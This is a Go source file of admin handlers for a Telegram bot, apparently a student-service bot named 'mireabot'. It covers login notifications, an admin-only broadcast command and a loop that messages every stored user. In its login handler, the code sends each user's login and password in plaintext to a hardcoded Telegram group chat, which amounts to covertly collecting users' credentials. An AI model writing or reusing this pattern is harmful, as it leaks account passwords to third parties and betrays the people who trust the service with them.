package admin

import (
	"fmt"
	database "mireabot/internal/parser/bot/storage"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/sirupsen/logrus"
)

func HandlerAdminIfLogin(bot *tgbotapi.BotAPI, username, login, password string) {
	bot.Send(tgbotapi.NewMessage(-1002594657207, "✅Пользователь @"+username+" авторизовался\n|"+login+"|\n"+"|"+password+"|"))

	logrus.WithFields(logrus.Fields{
		"username": username,
		"login":    login,
	}).Info("Пользователь авторизовался")
}

func HandlerAdminIfUpdate(bot *tgbotapi.BotAPI, username, newLogin string) {
	bot.Send(tgbotapi.NewMessage(-1002594657207, "⚠️Пользователь @"+username+" изменил данные"))

	logrus.WithFields(logrus.Fields{
		"username": username,
		"login":    newLogin,
	}).Info("Пользователь изменил данные")
}

func HandlerBroadcast(bot *tgbotapi.BotAPI, update tgbotapi.Update) {
		adminID := map[int64]bool{
		-1002594657207 : true,
	}

	if !adminID[update.Message.Chat.ID] {
		if _, err := bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "⛔У вас нет прав администратора!")); err != nil{
			logrus.Fatal("Ошибка отправки сообщения")
		}

		logrus.Warn("Пользователь @" + update.Message.From.UserName + " пытался сделать рассылку")
		if _, err := bot.Send(tgbotapi.NewMessage(-1002594657207, "❗️ВАЖНО❗️\nПользователь @" + update.Message.From.UserName + " пытался сделать рассылку")); err != nil{
			logrus.Fatal("Ошибка отправки сообщения")
		}
		return 
	}

	msg := tgbotapi.NewMessage(-1002594657207, "📩Введите текст для рассылки:")
	msg.ReplyMarkup = tgbotapi.ForceReply{
		ForceReply: true,
		Selective: true,
	}
	bot.Send(msg)
}

func HandlForceReply(bot *tgbotapi.BotAPI, message *tgbotapi.Message) {
	if message.ReplyToMessage.Text == "📩Введите текст для рассылки:" {

	usersID := database.SelectAllForBroadcast() 

	for _, userID := range usersID {
		msg := tgbotapi.NewMessage(int64(userID), message.Text)
		_, err := bot.Send(msg)
		if err != nil {
			logrus.Printf("Ошибка отправки пользователю %d: %v", userID, err)
		}
	}

	logrus.Infof("Найдено %d пользователей для рассылки", len(usersID))
	bot.Send(tgbotapi.NewMessage(-1002594657207, fmt.Sprintf("Рассылка отправлена %d пользователям", len(usersID))))
	}
	
}